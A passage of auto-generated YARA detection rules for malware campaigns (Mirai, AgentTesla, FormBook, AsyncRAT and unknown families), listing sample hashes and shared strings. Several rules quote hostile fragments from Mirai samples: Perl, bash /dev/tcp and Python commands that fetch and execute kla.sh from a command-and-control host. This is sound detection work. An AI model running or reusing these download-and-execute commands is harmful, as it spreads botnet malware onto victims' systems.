        $s1 = "JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==" ascii
        $s2 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s3 = "1sa18fyfR9OiVEMYglOpkqVoGLN7qd5aQNNi5W7/C+VBdHTBJcGZJyyP5B3qcz32" ascii
        $s4 = "MIGHAoGBAJ419DBEOgmQTzo5qXl5fQcN9TN455wkOL7052HzxxRVMyhYmwQcgJvh" ascii
        $s5 = "9mLJKudlVudV0Qxk5qUJaPZ/xupz0NyoVpviuiBOI1gNi8ovSXWzAgEC" ascii
        $s6 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s7 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s8 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s9 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s10 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
        $s11 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 3438472 and 12 of them
}

rule Sightlines_tlsh_36693cce_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-36693cce"
        date = "2026-10-29"
        campaign = "tlsh-36693cce"
        family = "mirai"
        hash = "0c1cf43713eb87341ea3a99d17605243285502255d31e074787d72531b788c41"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-36693cce.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|" ascii
        $s1 = "JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==" ascii
        $s2 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s3 = "1sa18fyfR9OiVEMYglOpkqVoGLN7qd5aQNNi5W7/C+VBdHTBJcGZJyyP5B3qcz32" ascii
        $s4 = "MIGHAoGBAJ419DBEOgmQTzo5qXl5fQcN9TN455wkOL7052HzxxRVMyhYmwQcgJvh" ascii
        $s5 = "9mLJKudlVudV0Qxk5qUJaPZ/xupz0NyoVpviuiBOI1gNi8ovSXWzAgEC" ascii
        $s6 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s7 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s8 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s9 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s10 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
        $s11 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 3438472 and 12 of them
}

rule Sightlines_tlsh_bb842806_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-bb842806"
        date = "2026-10-29"
        campaign = "tlsh-bb842806"
        family = "mirai"
        hash = "167c44b17a6f796970a2a18ff391ea9d8ed4a0cc6820e22615b11716da5704be"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-bb842806.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|" ascii
        $s1 = "JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==" ascii
        $s2 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s3 = "1sa18fyfR9OiVEMYglOpkqVoGLN7qd5aQNNi5W7/C+VBdHTBJcGZJyyP5B3qcz32" ascii
        $s4 = "MIGHAoGBAJ419DBEOgmQTzo5qXl5fQcN9TN455wkOL7052HzxxRVMyhYmwQcgJvh" ascii
        $s5 = "9mLJKudlVudV0Qxk5qUJaPZ/xupz0NyoVpviuiBOI1gNi8ovSXWzAgEC" ascii
        $s6 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s7 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s8 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s9 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s10 = "(pd)->header.sysinfo == THREAD_GETMEM (THREAD_SELF, header.sysinfo)" ascii
        $s11 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 3584384 and 12 of them
}

rule Sightlines_tlsh_192d571d_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-192d571d"
        date = "2026-10-29"
        campaign = "tlsh-192d571d"
        family = "mirai"
        hash = "865dd7bc61ba754ef5c8bc0452ae66385ae5b1bc78f90caa85d9f2b973ce497d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-192d571d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|" ascii
        $s1 = "JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==" ascii
        $s2 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s3 = "1sa18fyfR9OiVEMYglOpkqVoGLN7qd5aQNNi5W7/C+VBdHTBJcGZJyyP5B3qcz32" ascii
        $s4 = "MIGHAoGBAJ419DBEOgmQTzo5qXl5fQcN9TN455wkOL7052HzxxRVMyhYmwQcgJvh" ascii
        $s5 = "9mLJKudlVudV0Qxk5qUJaPZ/xupz0NyoVpviuiBOI1gNi8ovSXWzAgEC" ascii
        $s6 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s7 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s8 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s9 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s10 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
        $s11 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 3551368 and 12 of them
}

rule Sightlines_tlsh_8eaa92e7_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-8eaa92e7"
        date = "2026-10-29"
        campaign = "tlsh-8eaa92e7"
        family = "mirai"
        hash = "76ea3c8e523393464c9adb7ddeea8baa1469433a31556a4fdca705ca6197d66f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-8eaa92e7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|" ascii
        $s1 = "JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==" ascii
        $s2 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s3 = "1sa18fyfR9OiVEMYglOpkqVoGLN7qd5aQNNi5W7/C+VBdHTBJcGZJyyP5B3qcz32" ascii
        $s4 = "MIGHAoGBAJ419DBEOgmQTzo5qXl5fQcN9TN455wkOL7052HzxxRVMyhYmwQcgJvh" ascii
        $s5 = "9mLJKudlVudV0Qxk5qUJaPZ/xupz0NyoVpviuiBOI1gNi8ovSXWzAgEC" ascii
        $s6 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s7 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s8 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s9 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s10 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
        $s11 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 3165344 and 12 of them
}

rule Sightlines_tlsh_97e852b8_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-97e852b8"
        date = "2026-10-29"
        campaign = "tlsh-97e852b8"
        family = "mirai"
        hash = "226bd33caa93d3ed07e70f229d58188caa10caa369cf9d1fbcc3af2842b3c5b5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-97e852b8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|" ascii
        $s1 = "JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==" ascii
        $s2 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s3 = "1sa18fyfR9OiVEMYglOpkqVoGLN7qd5aQNNi5W7/C+VBdHTBJcGZJyyP5B3qcz32" ascii
        $s4 = "MIGHAoGBAJ419DBEOgmQTzo5qXl5fQcN9TN455wkOL7052HzxxRVMyhYmwQcgJvh" ascii
        $s5 = "9mLJKudlVudV0Qxk5qUJaPZ/xupz0NyoVpviuiBOI1gNi8ovSXWzAgEC" ascii
        $s6 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s7 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s8 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s9 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s10 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
        $s11 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2110816 and 12 of them
}

rule Sightlines_tlsh_96afc259_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-96afc259"
        date = "2026-10-29"
        campaign = "tlsh-96afc259"
        family = ""
        hash = "2606fc9c3b3f22688249fe71d57ac9a298a5617b8aa4ecb7ab96f1db405db11f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-96afc259.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "'' SIG '' gjcCAR4wJAIBAQQQTvApFpkntU2P5azhDxfrqwIBAAIB" ascii
        $s1 = "'Archeologically femineity241 fdningens, quirkiness20 priks! qual; zikurats, sporvognsbilletternes. " ascii
        $s2 = "'Fradragsjunglens sardinen. chickasaw otocysts. squeezable? entomologizing; dunghilly, frustrates137" ascii
        $s3 = "'Handkercher datoparkeringer jgere! wearifully196, folletage maharashtri194? spicosity: fremhvningen" ascii
        $s4 = "Modificeringenvalgperiod = RightB(\"Designvalgs\",237) " ascii
        $s5 = "'thoughtfreeness fieldwort35; airbound203, overluxuriancy kulsortes? monerozoan! suedes;" ascii
        $s6 = "'Reclaims correlatively? arteriogramme? piddling: semioxygenized154, chiffonets: undergrundsbaners." ascii
        $s7 = "'Marguerithas169 lydblges amfetaminens! epitrochoidal2 intervalhyppighed. covertures;" ascii
        $s8 = "'Konfirmrjr60? clarichord: dueliges166; hmskoene conjunctives mendicity? sjattedes," ascii
        $s9 = "'Murderingly. waw! aliquid, roskildesyge; bonefishes heroicly mynters containernumrets119; uhviskhed" ascii
        $s10 = "'Spaadommene249 frau195! pseudomoralistic! sycoceric; mccarthyisme. manifestational; arbejdslnninger" ascii
        $s11 = "Rehangingunscapablebiophy196 = LCAse(Deposersamphigour)" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_1d592067_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1d592067"
        date = "2026-10-29"
        campaign = "tlsh-1d592067"
        family = "mirai"
        hash = "1d1246dae68db71d2e6dc97c788460effd5286f477466a1b8851a0628f0acce1"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1d592067.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" ascii
        $s1 = "ST: urn:dial-multiscreen-org:service:dial:1" ascii
        $s2 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
        $s3 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" ascii
        $s4 = "HOST: 255.255.255.255:1900" ascii
        $s5 = "MAN: \"ssdp:discover\"" ascii
        $s6 = "M-SEARCH * HTTP/1.1" ascii
        $s7 = "service:service-agent" ascii
        $s8 = "objectClass0" ascii
        $s9 = "TeamSpeak" ascii
        $s10 = " default" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_caed03c5_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-caed03c5"
        date = "2026-10-28"
        campaign = "tlsh-caed03c5"
        family = ""
        hash = "0d44042288c2865dd6618a7117d6993d19c18d314a6eb297db0a3644af05a4a5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-caed03c5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "            \"._2Szzh5sKyGgnLUR870zbDE._13vrqU6oOqmmxrsZSW5O39._2lStU4uLIW5pByb98vQdpO{display:none!i" ascii
        $s1 = "        var nav = document.querySelectorAll(\"._2Lu3d-5qLmW4i19ysTt2jT._7AlhCx3XGzBeIrQaCneUD\");" ascii
        $s2 = "            var btn = box.querySelector('div._1K431RbY14lkaFW6-XgSsC._2FyQDUS2uHbW1fzoFK2jLx');" ascii
        $s3 = "        var menu = document.querySelectorAll(\"._2Lu3d-5qLmW4i19ysTt2jT._2UyOBeiSdBayaFdRa39N2O\");" ascii
        $s4 = "            \".__bvac_blocked ._19axKcqYRuaJ8vdYKYmtTQ{color:rgb(61,68,80)!important;}\" +" ascii
        $s5 = "        var url = 'http://127.0.0.1:6968/__callback/refresh_token?masked=' + encodeURIComponent(jwt)" ascii
        $s6 = "            \".__bvac_blocked ._3pofGqV0buiKAfMPEs3_82{display:none!important;}\" +" ascii
        $s7 = ".?AV?$_Func_impl_no_alloc@V<lambda_1>@?1??start@Remote@@YAXPEBDH@Z@V?$basic_string@DU?$char_traits@D" ascii
        $s8 = ".?AV?$_Func_impl_no_alloc@P6A_NAEBUTargetInfo@CDP@@@Z_NAEBU12@@std@@" ascii
        $s9 = "            var box = document.querySelector('div._3yz6xIaXDcStXAUzK4pWgE');" ascii
        $s10 = "        var el = document.querySelector('._1rEWOv1g1uTXNhoWiJLQZs');" ascii
        $s11 = ".?AV?$_Func_impl_no_alloc@V<lambda_3>@?1??connect_browser@Client@CDP@@AEAA_NAEBV?$basic_string@DU?$c" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 6144000 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_11d54e8e_agenttesla
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-11d54e8e"
        date = "2026-10-29"
        campaign = "dotnet_typelib_guid-11d54e8e"
        family = "agenttesla"
        hash = "1d86622d46ef87c4d2db72a031b7e927d31363e72e0fd4c95c69f23da5f3b9e1"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-11d54e8e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Docking Operation Rating: EXCELLENT (Grade A - Fully Compliant)" wide
        $s1 = "Ballast Tank Count: {0} | Combined Pump Capacity: {1} m3/hr" wide
        $s2 = "Block Loading Evenness: 98.4% balanced ({0:0.0} kN/m mean contact load)" wide
        $s3 = "Docking Operation Rating: ACCEPTABLE (Grade B - Monitoring Required)" wide
        $s4 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s5 = "Docking Operation Rating: EXCELLENT (Grade A)" wide
        $s6 = "Dry Dock Dimensions: Length={0} m, Pontoon Width={1} m, Wing Wall Height={2} m" wide
        $s7 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s8 = "Kile d'Shwita w'Shlama (Dock Trim, List & Stability Gauges)" wide
        $s9 = "Vessel Docked Status: OPERATION IN PROGRESS / SUBMERGED" wide
        $s10 = "Dukhra d'Shqala d'Nafqa (Docking Operation Report)" wide
        $s11 = "Pumping Time: {0:0.1} min | Estimated Generator Fuel: {1:0.1} Litres" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1955840 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_c5244e53_formbook
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-c5244e53"
        date = "2026-10-29"
        campaign = "dotnet_typelib_guid-c5244e53"
        family = "formbook"
        hash = "21af7d776011760bce54d51cefe0416d26888701696ddff544a5f6a307980f43"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-c5244e53.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "(RescueBase.MainForm+<ReadPixelBytes>d__3" ascii
        $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s4 = "Helicopter Status: GROUNDED due to weather on ridges." wide
        $s5 = "Operational Summary & Post-Incident Review" wide
        $s6 = "Warning: Team count or fitness below threshold!" wide
        $s7 = "System.Collections.Generic.IEnumerator<System.Byte>.get_Current" ascii
        $s8 = "System.Collections.Generic.IEnumerable<System.Byte>.GetEnumerator" ascii
        $s9 = "Weather alert: Helicopter grounded. Ground carry-off mandatory." wide
        $s10 = "Evacuation successfully completed! Casualty transferred to medical unit." wide
        $s11 = "Mountain Rescue Base Command - .NET 4.5" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1580032 and 12 of them
}

rule Sightlines_c2_220bfcd3_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-220bfcd3"
        date = "2026-10-29"
        campaign = "c2-220bfcd3"
        family = "mirai"
        hash = "1d1246dae68db71d2e6dc97c788460effd5286f477466a1b8851a0628f0acce1"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-220bfcd3.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" ascii
        $s1 = "ST: urn:dial-multiscreen-org:service:dial:1" ascii
        $s2 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
        $s3 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" ascii
        $s4 = "setsockopt(HDRINCL) failed" ascii
        $s5 = "Failed to create raw socket" ascii
        $s6 = "HOST: 255.255.255.255:1900" ascii
        $s7 = "MAN: \"ssdp:discover\"" ascii
        $s8 = "M-SEARCH * HTTP/1.1" ascii
        $s9 = "service:service-agent" ascii
        $s10 = "sendto failed" ascii
        $s11 = "FICMUHDKPJKCF" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_f97409f4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f97409f4"
        date = "2026-10-29"
        campaign = "tlsh-f97409f4"
        family = ""
        hash = "0034d4a18ee925ef19afa830e202918848aa2c4c150635332c1f32d0f27bbaa7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f97409f4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "set \"quicgoogle=\"%~dp0files\\quic_initial_www_google_com.bin\"\"" ascii
        $s1 = "set \"tlsgoogle=\"%~dp0files\\tls_clienthello_www_google_com.bin\"\"" ascii
        $s2 = "    set \"line=!line:{quicgoogle}=%quicgoogle%!\"" ascii
        $s3 = "    set \"line=!line:{youtube}=%youtube%!\"" ascii
        $s4 = "set \"youtube=\"%~dp0files\\youtube.txt\"\"" ascii
        $s5 = "    set \"line=!line:{tlsgoogle}=%tlsgoogle%!\"" ascii
        $s6 = "set \"ignore=\"%~dp0files\\ignore.txt\"\"" ascii
        $s7 = "set \"stun=\"%~dp0files\\stun.bin\"\"" ascii
        $s8 = "set \"pda=\"%~dp0files\\pda.bin\"\"" ascii
        $s9 = "setlocal enabledelayedexpansion" ascii
        $s10 = "chcp 65001 >nul" ascii
        $s11 = "set \"args=\"" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_d0a5e90a_formbook
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-d0a5e90a"
        date = "2026-10-29"
        campaign = "tlsh-d0a5e90a"
        family = "formbook"
        hash = "7306389f13becd510de6c1a5cafc5012200394fd48d9735b55d421dbfc2ccf29"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-d0a5e90a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "get_Action_Close_32x32" ascii
        $s4 = "Add;Plus;Bars;Ribbon;" ascii
        $s5 = ".NET Framework 4.5" ascii
        $s6 = "get_Edit_32x32" ascii
        $s7 = "get_Add_32x32" ascii
        $s8 = "lblStatusMsg" ascii
        $s9 = "50a3aPADPADC" ascii
        $s10 = "Copyright " ascii
        $s11 = "get_OPlus" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1575936 and 12 of them
}

rule Sightlines_tlsh_01d5b05c_asyncrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-01d5b05c"
        date = "2026-10-29"
        campaign = "tlsh-01d5b05c"
        family = "asyncrat"
        hash = "0aed713fcc46ad5d537aea9708d505eb2a1801df24f922d246f5a64c2bd67409"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-01d5b05c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "*NSt13__facet_shims12_GLOBAL__N_115moneypunct_shimIwLb0EEE" ascii
        $s1 = "*NSt13__facet_shims12_GLOBAL__N_115moneypunct_shimIcLb0EEE" ascii
        $s2 = "*NSt13__facet_shims12_GLOBAL__N_115moneypunct_shimIwLb1EEE" ascii
        $s3 = "*NSt13__facet_shims12_GLOBAL__N_115moneypunct_shimIcLb1EEE" ascii
        $s4 = "*NSt13__facet_shims12_GLOBAL__N_114money_put_shimIwEE" ascii
        $s5 = "*NSt13__facet_shims12_GLOBAL__N_114money_put_shimIcEE" ascii
        $s6 = "*NSt13__facet_shims12_GLOBAL__N_114money_get_shimIwEE" ascii
        $s7 = "*NSt13__facet_shims12_GLOBAL__N_113numpunct_shimIwEE" ascii
        $s8 = "*NSt13__facet_shims12_GLOBAL__N_114money_get_shimIcEE" ascii
        $s9 = "*NSt13__facet_shims12_GLOBAL__N_112collate_shimIwEE" ascii
        $s10 = "*NSt13__facet_shims12_GLOBAL__N_113numpunct_shimIcEE" ascii
        $s11 = "NSt7__cxx119money_putIwSt19ostreambuf_iteratorIwSt11char_traitsIwEEEE" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2302192 and 12 of them
}

rule Sightlines_tlsh_f951c813_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f951c813"
        date = "2026-10-29"
        campaign = "tlsh-f951c813"
        family = ""
        hash = "16f109e8411bc08341497c87704b7cf0d22a2678f1e3a7dca416ea7bff995469"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f951c813.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "python313.PyMarshal_ReadObjectFromString" ascii
        $s1 = "python313.PyErr_SetExcFromWindowsErrWithFilenameObjects" ascii
        $s2 = "python313._PyArg_VaParseTupleAndKeywords_SizeT" ascii
        $s3 = "python313.Py_HasFileSystemDefaultEncoding" ascii
        $s4 = "python313.PyImport_ExecCodeModuleWithPathnames" ascii
        $s5 = "python313.PyEval_CallObjectWithKeywords" ascii
        $s6 = "python313._PyArg_ParseTupleAndKeywords_SizeT" ascii
        $s7 = "python313.PyUnicode_CompareWithASCIIString" ascii
        $s8 = "python313.Py_FileSystemDefaultEncodeErrors" ascii
        $s9 = "python313.PyArg_ValidateKeywordArguments" ascii
        $s10 = "python313.PyUnicode_AsRawUnicodeEscapeString" ascii
        $s11 = "python313.PyErr_SetFromErrnoWithFilenameObjects" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_8f49c2e9_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-8f49c2e9"
        date = "2026-10-29"
        campaign = "tlsh-8f49c2e9"
        family = ""
        hash = "22a2dc9c95971a0a4d24e5568dc6c49bfaf6ce9bcf08e11b92e1470ff4613c47"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-8f49c2e9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "param([int]$Seconds = 180, [string]$ProcessName = 'NBA2K*')" ascii
        $s1 = "Copy-Item $repFile (Join-Path $Script:Runtime 'scan-last.txt') -Force" ascii
        $s2 = "    foreach ($a in @(Get-NetIPAddress -ErrorAction SilentlyContinue)) { $local[($a.IPAddress -replac" ascii
        $s3 = "        if (@(Get-Process -Id $gamePids -ErrorAction SilentlyContinue).Count -eq 0) { Write-Host '';" ascii
        $s4 = "$repFile = Join-Path $Script:Runtime ('scan-' + $stamp + '.txt')" ascii
        $s5 = "        foreach ($c in @(Get-NetTCPConnection -OwningProcess @($procName.Keys) -ErrorAction Silently" ascii
        $s6 = "$EacNames = @('EasyAntiCheat*', 'start_protected_game*')" ascii
        $s7 = "    foreach ($p in @(Get-Process -Name (@($ProcessName) + $EacNames) -ErrorAction SilentlyContinue))" ascii
        $s8 = "$report = New-Object System.Collections.Generic.List[string]" ascii
        $s9 = "while ($procs.Count -eq 0 -and (Get-Date) -lt $waitUntil) {" ascii
        $s10 = " (ETW Microsoft-Windows-Kernel-Network)." ascii
        $s11 = "$etl = Join-Path $Script:Runtime 'scan.etl'" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_865c4b53_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-865c4b53"
        date = "2026-10-29"
        campaign = "tlsh-865c4b53"
        family = ""
